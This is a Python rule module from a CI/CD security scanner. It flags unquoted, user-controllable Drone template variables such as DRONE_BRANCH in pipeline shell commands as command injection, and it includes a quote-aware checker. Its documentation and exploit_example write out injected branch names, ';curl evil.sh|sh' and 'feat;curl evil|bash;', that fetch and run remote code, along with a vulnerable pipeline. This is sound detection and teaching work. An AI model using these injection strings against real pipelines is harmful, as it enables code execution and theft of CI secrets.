"""DR-003. Drone template variable interpolated unquoted into commands."""
from __future__ import annotations

import re

from ...base import Finding, Severity
from ...rule import Rule
from ..base import (
    Pipeline,
    is_container_pipeline,
    iter_steps,
    step_commands,
    step_label,
)

RULE = Rule(
    id="DR-003",
    title="Untrusted Drone template variable in shell command",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4", "CICD-SEC-1"),
    esf=("ESF-D-RUNTIME-HARDENING",),
    cwe=("CWE-78",),
    recommendation=(
        "Treat user-controllable Drone template variables as "
        "tainted. Drone substitutes ``${DRONE_*}`` tokens "
        "*before* the shell parses the command, so an unquoted "
        "use is a textbook command-injection primitive. The "
        "safe pattern is to copy the value into the step's "
        "``environment:`` block (``MSG: ${DRONE_PULL_REQUEST_"
        "TITLE}``) and reference the env var quoted in the "
        "command (``echo \"$MSG\"``). Drone's own docs call out "
        "the same hardening for build-message / commit-author "
        "fields."
    ),
    docs_note=(
        "User-controllable substitution sources flagged by this "
        "rule:\n\n"
        "- ``DRONE_COMMIT_MESSAGE`` / ``DRONE_COMMIT_AUTHOR*``\n"
        "- ``DRONE_PULL_REQUEST_TITLE`` / "
        "``DRONE_PULL_REQUEST_BRANCH``\n"
        "- ``DRONE_TAG_MESSAGE`` (tag annotations are author-"
        "controlled)\n"
        "- ``DRONE_BRANCH`` / ``DRONE_SOURCE_BRANCH`` / "
        "``DRONE_TARGET_BRANCH`` (branch names are pushable, so "
        "an attacker can craft a name like ``;curl evil.sh|sh``)\n"
        "- ``DRONE_REPO_*`` (in fork PRs the repo metadata "
        "comes from the fork)\n\n"
        "The rule only fires on **unquoted** uses inside a "
        "command body. Quoted (``\"${DRONE_*}\"``) or "
        "single-quoted uses are safe in POSIX shell because "
        "the substitution runs after Drone's templating but "
        "the shell still tokenises the expanded value as a "
        "single argument. Same model as the Tekton TKN-003 / "
        "Argo ARGO-005 / Buildkite BK-003 rules in this catalog."
    ),
    known_fp=(
        "Trusted-only Drone variables (``DRONE_BUILD_NUMBER``, "
        "``DRONE_BUILD_STATUS``, ``DRONE_REPO_NAMESPACE`` for "
        "non-fork repos) aren't user-controllable and are safe "
        "to interpolate unquoted. Drone-template syntax can also "
        "appear in YAML strings outside ``commands:``; this rule "
        "only scopes itself to step command bodies, so an "
        "unquoted use in (say) ``settings.message:`` doesn't "
        "fire here, those land under DR-004 / SBOM-style "
        "audits.",
    ),
    exploit_example=(
        "# Vulnerable: a branch named ``feat;curl evil|bash;`` lands\n"
        "# verbatim in the shell command via the\n"
        "# ``${DRONE_BRANCH}`` template variable. The injected\n"
        "# ``curl`` runs in the step's shell context with the\n"
        "# step's full secret set in scope.\n"
        "kind: pipeline\n"
        "type: docker\n"
        "name: build\n"
        "steps:\n"
        "  - name: build\n"
        "    image: alpine@sha256:abc123...\n"
        "    commands:\n"
        "      - echo \"Building ${DRONE_BRANCH}\"\n"
        "      - ./build.sh --branch ${DRONE_BRANCH}\n"
        "\n"
        "# Safe: assign the untrusted value to a local shell\n"
        "# variable, quote on every use, and pass as an argument\n"
        "# to a script you own. Drone's template substitution\n"
        "# happens BEFORE the shell sees the command, so the\n"
        "# defense has to be at the shell layer.\n"
        "kind: pipeline\n"
        "type: docker\n"
        "name: build\n"
        "steps:\n"
        "  - name: build\n"
        "    image: alpine@sha256:abc123...\n"
        "    environment:\n"
        "      BRANCH: ${DRONE_BRANCH}\n"
        "    commands:\n"
        "      - echo \"Building $BRANCH\"\n"
        "      - ./build.sh --branch \"$BRANCH\""
    ),
)


# Author-controllable Drone template variables. Listed in the
# docs_note above; this is the same set, deduplicated and joined
# with ``|`` for the regex. Anchor the suffix with ``\b`` so
# ``DRONE_BRANCH`` doesn't match ``DRONE_BRANCHES`` or any
# similarly-named field a user might add to ``environment:``.
_TAINTED_VARS = (
    "DRONE_COMMIT_MESSAGE",
    "DRONE_COMMIT_AUTHOR",
    "DRONE_COMMIT_AUTHOR_NAME",
    "DRONE_COMMIT_AUTHOR_EMAIL",
    "DRONE_COMMIT_REF",
    "DRONE_PULL_REQUEST_TITLE",
    "DRONE_PULL_REQUEST_BRANCH",
    "DRONE_TAG_MESSAGE",
    "DRONE_BRANCH",
    "DRONE_SOURCE_BRANCH",
    "DRONE_TARGET_BRANCH",
    "DRONE_REPO",
    "DRONE_REPO_NAME",
    "DRONE_REPO_NAMESPACE",
    "DRONE_REPO_OWNER",
)


# Match a ``${VAR}`` or bare ``$VAR`` interpolation against the
# tainted-variable list. Quote-state filtering happens in
# ``_line_is_unquoted_use`` (which walks the string tracking
# single + double quote regions); the regex itself only has to
# match the ``$VAR`` / ``${VAR}`` tokens.
_VAR_GROUP = "|".join(re.escape(v) for v in _TAINTED_VARS)
_INTERP_RE = re.compile(
    rf"\$\{{?(?:{_VAR_GROUP})\}}?\b",
)


def _line_is_unquoted_use(line: str) -> bool:
    """True when *line* contains a tainted Drone variable used
    outside a quoted token.

    Walks the line tracking quote state and only flags hits that
    fall outside both single- and double-quoted regions. Avoids
    a false positive on ``echo "${DRONE_BRANCH}"`` which the
    naive regex above would otherwise flag.
    """
    in_single = False
    in_double = False
    i = 0
    while i < len(line):
        ch = line[i]
        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue
        if ch == "$" and not (in_single or in_double):
            # Try to match a tainted-var token at this offset.
            m = _INTERP_RE.match(line, i)
            if m:
                return True
        i += 1
    return False


def check(pipeline: Pipeline) -> Finding:
    if not is_container_pipeline(pipeline):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=pipeline.path,
            description=(
                "Pipeline type is not container-flavored, no "
                "shell command surface to scan."
            ),
            recommendation=RULE.recommendation, passed=True,
        )
    offenders: list[str] = []
    for idx, step in iter_steps(pipeline):
        for cmd in step_commands(step):
            for line in cmd.splitlines() or [cmd]:
                if _line_is_unquoted_use(line):
                    offenders.append(
                        f"steps.{step_label(step, idx)}: "
                        f"{line.strip()[:80]}"
                    )
                    break
    passed = not offenders
    desc = (
        "No step interpolates an untrusted Drone template "
        "variable unquoted in a command."
        if passed else
        f"{len(offenders)} step(s) interpolate untrusted "
        f"Drone variables unquoted: {'; '.join(offenders[:3])}"
        f"{'...' if len(offenders) > 3 else ''}."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=pipeline.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
